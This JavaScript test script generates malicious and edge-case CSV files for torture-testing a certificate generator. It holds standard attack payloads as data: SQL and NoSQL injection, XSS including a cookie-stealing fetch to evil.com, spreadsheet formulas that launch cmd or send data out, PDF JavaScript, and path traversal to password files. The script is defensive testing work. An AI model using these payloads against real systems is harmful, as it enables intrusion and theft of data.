/**
 * ╔══════════════════════════════════════════════════════════════════════════════╗
 * ║              PROOFSY MALICIOUS CSV GENERATOR                               ║
 * ║                                                                            ║
 * ║  Generates extreme edge-case CSV files for torture testing the             ║
 * ║  certificate generation pipeline.                                          ║
 * ║                                                                            ║
 * ║  Usage: node tests/malicious-csv-generator.js [output-dir]                ║
 * ╚══════════════════════════════════════════════════════════════════════════════╝
 */

const fs = require("fs");
const path = require("path");
const crypto = require("crypto");

const OUTPUT_DIR = process.argv[2] || path.join(__dirname, "malicious_csvs");

if (!fs.existsSync(OUTPUT_DIR)) {
  fs.mkdirSync(OUTPUT_DIR, { recursive: true });
}

function writeCSV(filename, rows) {
  const header = "name,email\n";
  const body = rows.map((r) => `${r.name},${r.email}`).join("\n");
  const filepath = path.join(OUTPUT_DIR, filename);
  fs.writeFileSync(filepath, header + body, "utf8");
  console.log(`  ✓ Generated: ${filepath} (${rows.length} rows, ${fs.statSync(filepath).size} bytes)`);
  return filepath;
}

console.log("\n╔══════════════════════════════════════════════════════╗");
console.log("║         PROOFSY MALICIOUS CSV GENERATOR              ║");
console.log("╚══════════════════════════════════════════════════════╝\n");

// ─── 1. EMPTY CSV ────────────────────────────────────────────────────────────
fs.writeFileSync(path.join(OUTPUT_DIR, "empty.csv"), "", "utf8");
console.log("  ✓ Generated: empty.csv (0 bytes)");

// ─── 2. HEADER ONLY CSV ──────────────────────────────────────────────────────
fs.writeFileSync(path.join(OUTPUT_DIR, "header_only.csv"), "name,email\n", "utf8");
console.log("  ✓ Generated: header_only.csv (header only, no data)");

// ─── 3. SINGLE BYTE CSV ──────────────────────────────────────────────────────
fs.writeFileSync(path.join(OUTPUT_DIR, "single_byte.csv"), "x", "utf8");
console.log("  ✓ Generated: single_byte.csv (1 byte)");

// ─── 4. SQL INJECTION CSV ────────────────────────────────────────────────────
writeCSV("sql_injection.csv", [
  { name: "'; DROP TABLE certificates; --", email: "sqli@evil.com" },
  { name: "1' OR '1'='1", email: "sqli2@evil.com" },
  { name: "' UNION SELECT * FROM users --", email: "sqli3@evil.com" },
  { name: "1; EXEC xp_cmdshell('cmd.exe') --", email: "sqli4@evil.com" },
  { name: "Robert'); DROP TABLE students;--", email: "bobby@tables.com" },
  { name: "' OR 1=1 --", email: "tautology@evil.com" },
  { name: "'; WAITFOR DELAY '0:0:10' --", email: "timebased@evil.com" },
  { name: "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --", email: "xml@evil.com" },
]);

// ─── 5. NOSQL INJECTION CSV ──────────────────────────────────────────────────
writeCSV("nosql_injection.csv", [
  { name: '{"$ne": null}', email: "nosql1@evil.com" },
  { name: '{"$gt": ""}', email: "nosql2@evil.com" },
  { name: '{"$regex": ".*"}', email: "nosql3@evil.com" },
  { name: '{"$where": "this.password.length > 0"}', email: "nosql4@evil.com" },
  { name: '{"$or": [{"admin": true}]}', email: "nosql5@evil.com" },
  { name: '{"__proto__": {"admin": true}}', email: "proto@evil.com" },
  { name: '{"constructor": {"prototype": {"isAdmin": true}}}', email: "construct@evil.com" },
]);

// ─── 6. JAVASCRIPT PROTOTYPE POLLUTION CSV ───────────────────────────────────
writeCSV("prototype_pollution.csv", [
  { name: "__proto__", email: "proto1@evil.com" },
  { name: "constructor.prototype.isAdmin", email: "proto2@evil.com" },
  { name: '{"__proto__":{"admin":true}}', email: "proto3@evil.com" },
  { name: '{"constructor":{"prototype":{"role":"owner"}}}', email: "proto4@evil.com" },
  { name: "__defineGetter__('admin', function(){return true})", email: "proto5@evil.com" },
]);

// ─── 7. XSS / HTML INJECTION CSV ─────────────────────────────────────────────
writeCSV("xss_injection.csv", [
  { name: '<script>alert("XSS")</script>', email: "xss1@evil.com" },
  { name: '<img onerror="alert(1)" src=x>', email: "xss2@evil.com" },
  { name: "javascript:alert(document.cookie)", email: "xss3@evil.com" },
  { name: '<svg onload="alert(1)">', email: "xss4@evil.com" },
  { name: '<iframe src="https://evil.com"></iframe>', email: "xss5@evil.com" },
  { name: '"><script>fetch("https://evil.com/steal?c="+document.cookie)</script>', email: "xss6@evil.com" },
  { name: '<body onload=alert(1)>', email: "xss7@evil.com" },
  { name: '<input onfocus=alert(1) autofocus>', email: "xss8@evil.com" },
  { name: '<marquee onstart=alert(1)>', email: "xss9@evil.com" },
  { name: '<details open ontoggle=alert(1)>', email: "xss10@evil.com" },
]);

// ─── 8. CSV FORMULA INJECTION CSV ────────────────────────────────────────────
writeCSV("formula_injection.csv", [
  { name: "=CMD|' /C calc'!A0", email: "formula1@evil.com" },
  { name: "@SUM(1+1)*cmd|' /C calc'!A0", email: "formula2@evil.com" },
  { name: "+SUMPRODUCT(1,cmd|'/C calc'!A0)", email: "formula3@evil.com" },
  { name: "-1+cmd|'/C calc'!A0", email: "formula4@evil.com" },
  { name: "=IMPORTRANGE('https://evil.com/steal','Sheet1!A1:Z999')", email: "formula5@evil.com" },
  { name: "=HYPERLINK(\"https://evil.com/phish\",\"Click Me\")", email: "formula6@evil.com" },
  { name: "=IMAGE(\"https://evil.com/track.png\")", email: "formula7@evil.com" },
  { name: '|calc.exe', email: "formula8@evil.com" },
  { name: "DDE(\"cmd\";\"calc\";\"__\")", email: "formula9@evil.com" },
]);

// ─── 9. NULL BYTES & CONTROL CHARACTERS CSV ──────────────────────────────────
writeCSV("control_chars.csv", [
  { name: "User\x00Name", email: "null1@evil.com" },
  { name: "User\x01\x02\x03Name", email: "ctrl@evil.com" },
  { name: "User\x08\x7FName", email: "backspace@evil.com" },
  { name: "User\r\nInjected\r\nName", email: "crlf@evil.com" },
  { name: "User\tTab\tName", email: "tab@evil.com" },
  { name: "User\x1B[31mRED\x1B[0mName", email: "ansi@evil.com" },
  { name: "User\x0ANewline\x0DReturn", email: "newline@evil.com" },
]);

// ─── 10. PDF COMMAND INJECTION CSV ────────────────────────────────────────────
writeCSV("pdf_injection.csv", [
  { name: "%) /Type /Annot /Subtype /Link /A << /URI (https://evil.com) >> (", email: "pdf1@evil.com" },
  { name: "%) /JS (app.alert('XSS')) (", email: "pdf2@evil.com" },
  { name: "BT /F1 24 Tf 100 700 Td (HACKED) Tj ET", email: "pdf3@evil.com" },
  { name: "/JavaScript << /JS (app.launchURL('https://evil.com', true)) >>", email: "pdf4@evil.com" },
]);

// ─── 11. UNICODE EDGE CASES CSV ──────────────────────────────────────────────
writeCSV("unicode_edge_cases.csv", [
  { name: "Ren\u00e9 M\u00fcller", email: "unicode1@test.io" },        // Precomposed
  { name: "Rene\u0301 Mu\u0308ller", email: "unicode2@test.io" },      // Decomposed
  { name: "\u200B\u200BZero\u200BWidth\u200B", email: "zwsp@test.io" }, // Zero-width spaces
  { name: "\u202Eevil\u202C", email: "rtl@test.io" },                  // RTL override
  { name: "🎓 Graduate 🏆🥇", email: "emoji@test.io" },               // Emoji
  { name: "محمد عبدالله", email: "arabic@test.io" },                   // Arabic
  { name: "שלום עולם", email: "hebrew@test.io" },                      // Hebrew
  { name: "田中太郎", email: "japanese@test.io" },                       // Japanese
  { name: "한국어 이름", email: "korean@test.io" },                      // Korean
  { name: "User\uFEFFName", email: "bom@test.io" },                    // BOM character
  { name: "\u0000\u0000\u0000", email: "nullstr@test.io" },            // All nulls
  { name: "\uD800\uDC00", email: "surrogate@test.io" },                // Surrogate pair
]);

// ─── 12. BUFFER OVERFLOW NAMES CSV ───────────────────────────────────────────
const megabyteName = "A".repeat(1024 * 1024); // 1MB name
writeCSV("buffer_overflow.csv", [
  { name: megabyteName, email: "overflow@evil.com" },
  { name: "B".repeat(50000), email: "large1@evil.com" },
  { name: "C".repeat(100000), email: "large2@evil.com" },
]);

// ─── 13. DUPLICATE EMAILS CSV ────────────────────────────────────────────────
const duplicates = [];
for (let i = 0; i < 100; i++) {
  duplicates.push({ name: `User ${i}`, email: "duplicate@test.io" }); // Same email, 100 times
}
writeCSV("duplicate_emails.csv", duplicates);

// ─── 14. MISSING COLUMNS CSV ─────────────────────────────────────────────────
fs.writeFileSync(
  path.join(OUTPUT_DIR, "missing_columns.csv"),
  "first_name,last_name,phone\nJohn,Doe,555-1234\nJane,Smith,555-5678\n",
  "utf8"
);
console.log("  ✓ Generated: missing_columns.csv (wrong column names)");

// ─── 15. EXTRA COLUMNS CSV ──────────────────────────────────────────────────
fs.writeFileSync(
  path.join(OUTPUT_DIR, "extra_columns.csv"),
  "name,email,role,admin,password\nAdmin,admin@test.io,owner,true,hunter2\nUser,user@test.io,editor,false,pass123\n",
  "utf8"
);
console.log("  ✓ Generated: extra_columns.csv (extra dangerous columns)");

// ─── 16. HUGE ROW COUNT CSV (51,000 rows — exceeds MAX_CSV_ROWS) ────────────
const hugeRows = [];
for (let i = 0; i < 51000; i++) {
  hugeRows.push({ name: `User${i}`, email: `user${i}@huge.io` });
}
writeCSV("exceeds_limit.csv", hugeRows);

// ─── 17. COMMA AND QUOTE INJECTION CSV ───────────────────────────────────────
writeCSV("csv_structure_attack.csv", [
  { name: '"John","evil@attacker.com"\nMalicious', email: "legit@test.io" },
  { name: 'Name"","extra_column","more"', email: "structure1@evil.com" },
  { name: "Line1\nname,email\nEvil,evil@evil.com", email: "newrow@evil.com" },
]);

// ─── 18. LDAP INJECTION CSV ──────────────────────────────────────────────────
writeCSV("ldap_injection.csv", [
  { name: "*()|&'", email: "ldap1@evil.com" },
  { name: "admin)(&)", email: "ldap2@evil.com" },
  { name: "*)((|(objectclass=*)", email: "ldap3@evil.com" },
]);

// ─── 19. PATH TRAVERSAL CSV ──────────────────────────────────────────────────
writeCSV("path_traversal.csv", [
  { name: "../../../etc/passwd", email: "path1@evil.com" },
  { name: "..\\..\\..\\windows\\system32\\config\\sam", email: "path2@evil.com" },
  { name: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", email: "path3@evil.com" },
  { name: "....//....//....//etc/passwd", email: "path4@evil.com" },
]);

// ─── 20. MIXED ALL-IN-ONE TORTURE CSV ────────────────────────────────────────
writeCSV("all_attacks_combined.csv", [
  { name: "'; DROP TABLE certs; --", email: "combo1@evil.com" },
  { name: '<script>alert("XSS")</script>', email: "combo2@evil.com" },
  { name: '{"$ne": null}', email: "combo3@evil.com" },
  { name: "=CMD|' /C calc'!A0", email: "combo4@evil.com" },
  { name: "User\x00Name", email: "combo5@evil.com" },
  { name: "__proto__", email: "combo6@evil.com" },
  { name: "../../../etc/passwd", email: "combo7@evil.com" },
  { name: "🎓 محمد שלום", email: "combo8@evil.com" },
  { name: "A".repeat(10000), email: "combo9@evil.com" },
  { name: "Normal User", email: "normal@test.io" }, // Sanity check
]);

console.log(`\n✅ All malicious CSVs generated in: ${OUTPUT_DIR}\n`);
console.log("Total files:", fs.readdirSync(OUTPUT_DIR).length);
